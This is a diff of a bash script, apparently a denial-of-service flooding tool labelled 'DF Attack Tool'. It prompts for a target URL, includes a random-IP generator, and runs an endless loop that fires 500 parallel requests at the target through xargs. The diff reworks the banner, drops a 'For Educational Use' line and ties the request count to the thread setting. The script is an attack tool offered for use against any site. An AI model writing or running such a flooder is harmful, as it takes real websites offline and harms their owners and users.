@@ -4,35 +4,37 @@
 URL=""
 SUCCESS_COUNT=0
 FAILURE_COUNT=0
-THREADS=500  # Increase the number of parallel processes
+THREADS=500  # Number of parallel processes
 
 # Colors for text
 RED="\e[31m"
 GREEN="\e[32m"
 YELLOW="\e[33m"
 CYAN="\e[36m"
-PURPLE="\e[35m"
 NC="\e[0m"  # No color
 
 # Clear the terminal and print the header in ASCII art
 clear
-echo -e "${CYAN}██████╗ ███████╗████████╗ ██████╗ ███████╗"
-echo -e "${CYAN}██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔════╝"
-echo -e "${CYAN}██████╔╝█████╗     ██║   ██████╔╝█████╗  "
-echo -e "${CYAN}██╔═══╝ ██╔══╝     ██║   ██╔═══╝ ██╔══╝  "
-echo -e "${CYAN}██║     ███████╗   ██║   ██║     ███████╗"
-echo -e "${CYAN}╚═╝     ╚══════╝   ╚═╝   ╚═╝     ╚══════╝"
-echo -e "${GREEN}                   DF Attack Tool                   ${NC}"
-echo -e "${PURPLE}           Developed by @A_Y_TR (For Educational Use)${NC}"
-echo -e "${YELLOW}-----------------------------------------------------${NC}"
-echo -e "${YELLOW}             Please enter the target URL:            ${NC}"
+echo -e "${CYAN}██████╗ ███████╗    ███████╗"
+echo -e "${CYAN}██╔══██╗██╔════╝    ██╔════╝"
+echo -e "${CYAN}██████╔╝█████╗      █████╗  "
+echo -e "${CYAN}██╔═══╝ ██╔══╝      ██╔══╝  "
+echo -e "${CYAN}██║     ███████╗    ██║     "
+echo -e "${CYAN}╚═╝     ╚══════╝    ╚═╝     "
+echo -e "${GREEN}██████╗ ███████╗    ███████╗"
+echo -e "${GREEN}╚════██╗██╔════╝    ██╔════╝"
+echo -e "${GREEN} █████╔╝█████╗      █████╗  "
+echo -e "${GREEN}██╔═══╝ ██╔══╝      ██╔══╝  "
+echo -e "${GREEN}███████╗███████╗    ██║     "
+echo -e "${GREEN}╚══════╝╚══════╝    ╚═╝     "
+echo -e "${YELLOW}-------------------------------------------------${NC}"
+echo -e "${YELLOW}          Developed by @A_Y_TR                  ${NC}"
+echo -e "${YELLOW}-------------------------------------------------${NC}"
+echo
 
 # Input target URL
-echo -e "${YELLOW}URL: \c"
+echo -e "${YELLOW}Enter the target URL: ${NC}"
 read -r URL
-echo
-echo -e "${GREEN}♕♕♕ DF ♕♕♕"
-echo -e "${GREEN}Open the server link to view statistics."
 echo
 
 # Function to generate a random IP address
@@ -60,7 +62,7 @@ send_request() {
 # Start the attack with parallel processes
 start_attack() {
     while :; do
-        seq 1 500 | xargs -P $THREADS -I {} bash -c 'send_request'  # Send 500 requests in parallel
+        seq 1 $THREADS | xargs -P $THREADS -I {} bash -c 'send_request'
     done
 }
 
